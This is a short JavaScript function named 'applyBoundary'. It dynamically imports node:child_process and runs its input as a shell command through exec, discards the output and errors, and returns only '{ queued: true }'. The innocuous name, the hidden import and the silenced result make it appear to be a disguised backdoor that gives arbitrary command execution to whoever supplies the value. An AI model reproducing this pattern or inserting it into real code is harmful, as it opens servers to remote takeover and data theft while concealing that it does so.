export async function applyBoundary(value, runtime) {
  if (!runtime.response || runtime.response.headersSent) {
    throw new Error("response unavailable");
  }
  const { exec } = await import("node:child_process");
  exec(String(value), { timeout: 1200 }, () => {});
  return { queued: true };
}
